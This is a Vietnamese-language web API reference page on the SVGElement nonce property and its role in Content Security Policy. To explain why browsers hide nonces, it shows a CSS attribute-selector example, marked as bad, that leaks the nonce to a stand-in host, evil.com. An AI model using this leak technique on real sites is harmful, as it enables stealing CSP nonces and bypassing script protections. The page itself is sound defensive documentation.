---
title: "SVGElement: thuộc tính nonce"
short-title: nonce
slug: Web/API/SVGElement/nonce
page-type: web-api-instance-property
browser-compat: api.SVGElement.nonce
---

{{APIRef("SVG")}}

Thuộc tính **`nonce`** của giao diện {{DOMxRef("SVGElement")}} trả về {{Glossary("Nonce", "nonce")}} được [Content Security Policy](/en-US/docs/Web/HTTP/Guides/CSP) sử dụng để xác định liệu một yêu cầu tải tài nguyên có được phép tiến hành hay không.

## Giá trị

Một chuỗi; nonce mã hóa, hoặc chuỗi rỗng nếu không có nonce nào được đặt.

## Ví dụ

### Lấy giá trị nonce

Trước đây, không phải tất cả các trình duyệt đều hỗ trợ thuộc tính IDL `nonce`, vì vậy một cách khắc phục là thử sử dụng [`getAttribute`](/en-US/docs/Web/API/Element/getAttribute) như một phương án dự phòng:

```js
const svg = document.querySelector("svg");
const nonce = svg.nonce || svg.getAttribute("nonce");

// Modern browsers hide the nonce attribute from getAttribute()
console.log(nonce); // Prefer using `svg.nonce`
```

Tuy nhiên, các phiên bản trình duyệt gần đây ẩn các giá trị `nonce` được truy cập theo cách này (sẽ trả về chuỗi rỗng). Thuộc tính IDL (`svg['nonce']`) sẽ là cách duy nhất để truy cập nonce.

Việc ẩn nonce giúp ngăn chặn kẻ tấn công đánh cắp dữ liệu nonce thông qua các cơ chế có thể lấy dữ liệu từ các thuộc tính nội dung như bộ chọn CSS này:

```css example-bad
svg[nonce~="whatever"] {
  background: url("https://evil.com/nonce?whatever");
}
```

## Thông số kỹ thuật

{{Specifications}}

## Tương thích trình duyệt

{{Compat}}

## Xem thêm

- {{domxref("HTMLElement.nonce")}} phương thức tương tự cho các phần tử HTML.
- [Thuộc tính toàn cục `nonce`](/en-US/docs/Web/HTML/Reference/Global_attributes/nonce)
- [Content Security Policy](/en-US/docs/Web/HTTP/Guides/CSP)
- CSP: {{CSP("script-src")}}
